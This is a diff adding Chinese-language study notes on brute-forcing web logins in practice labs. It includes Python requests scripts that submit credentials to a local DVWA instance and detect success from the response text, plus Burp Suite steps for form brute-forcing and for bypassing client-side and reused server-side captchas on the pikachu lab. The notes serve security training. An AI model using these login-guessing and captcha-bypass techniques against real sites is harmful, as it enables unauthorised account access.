@@ -300,7 +300,97 @@
           run_bruteforce(host, user_queue, pass_queue, max_threads=30)
 
 5:Web暴力破解
-  
+  5.1:
+	这次爆破基于dvwa靶场:
+			那么首先就要搭建好DVWA靶场,搭建好后,进入暴力破解页面,可以根据输入正确和错误的用户名和密码时页面的不同响应来判断是否爆破成功
+		此时使用wireshark抓包发现包提供的信息有:
+			username							输入的用户名
+			password							输入的密码
+			login									登录选项
+	5.2:下面使用python的requests库来实现
+		5.2.1:简介
+			Requests库:Request中提供了两种HTTP请求方法：GET()和POST()，
+			其中GET()用于从指定的资源请求数据；POST()用于向指定的资源提交将被处理的数据。
+		5.2.2:python实现
+			import  requests
+			url = 'http://127.0.0.1/dvwa/vulnerabilities/brute/'
+			def bruter(username,password):
+			    data = {
+			        'username':username,
+			        'password':password,
+			        'submit':'Login'
+			    }
+			    try:
+			        response = requests.post(url,data)
+			        if response.status_code ==200:
+			            print('Login success')
+			            return
+			        else:
+			            print('Login failed')
+			    except requests.exceptions.ConnectionError:
+			        print('Error:Connect failed')
+			    except Exception as e:
+			        print(f'Error: {str(e)}')
+			if __name__ == '__main__':
+			    user = 'admin'
+			    passwd = 'password'
+			    bruter(user,passwd)
+		
+		5.2.3:有时候只凭借状态码是不够的,可以根据页面的响应来判断
+				在DVWA中,登录成功时,页面提示:
+					 Welcome to the password protected area admin.
+				登录失败:
+					 Username and/or password incorrect.
+				由此,可以根据响应response中是否含有上面的内容来判断
+		5.2.4:python
+				import  requests
+				url = 'http://127.0.0.1/dvwa/vulnerabilities/brute/'
+				SUCCESS = 'Welcome to the password protected area admin.'
+				def bruter(username,password):
+				    data = {
+				        'username':username,
+				        'password':password,
+				        'submit':'Login'
+				    }
+				    try:
+				        response = requests.post(url,data)
+				        if SUCCESS in response.text:
+				            print('Login success')
+				            return
+				        else:
+				            print('Login failed')
+				            return
+				    except requests.exceptions.ConnectionError:
+				        print(f'[!]Error: connect failed')
+				    except Exception as e:
+				        print(f'[!]Error:{str(e)}')
+				
+				if __name__ == '__main__':
+				    user = 'admin'
+				    passwd = 'password'
+				    bruter(user,passwd)
 
+6:使用burpsuite对网络认证服务的攻击
+		6.1:介绍
+				BurpSuite在这里的主要作用是在用户使用的浏览器和目标服务器之间充当一个中间人的角色。
+				这样当在浏览器中输入数据之后，数据包首先提交到BurpSuite处，BurpSuite可以将这个数据包进行复制，
+				修改之后再提交到服务器处。所以BurpSuite此时相当于代理服务器。
+			首先在kali的applications中启动BurpSuite.
+		6.2:基于表单的暴力破解
+				pass
+				需要注意的是:
+				可以设置匹配响应内容,那么这时候就可以根据响应内容是否含有登录成功的标志来判断
+		6.3:绕过验证码(客户端)
+				为了避免受到暴力破解,登录页面往往会设置验证码.
+				但是在使用bp进行暴力破解时,发现直接跳过了客户端的执行阶段,无需考虑验证码的正确与否,都可以进行repeater
+			产生这种情况的原因是:为了减轻服务端的负载,才会把验证过程放在客户端,导致这样的漏洞
+		6.4:绕过验证码(服务端)
+				由于可以绕过客户端验证码,因此将验证码放在服务端,但是如果验证码长期有效
+				那么就可以使用同一验证码来提交多个登录请求
+			可以在pikachu靶场实现:
+				打开目标页面,获取验证码,再次使用bp,把vcode的值改为验证码的值,就可以再次进行爆破了
+				但是服务端不像客户端那样,可以随便更改验证码的内容
+
+				
 
 
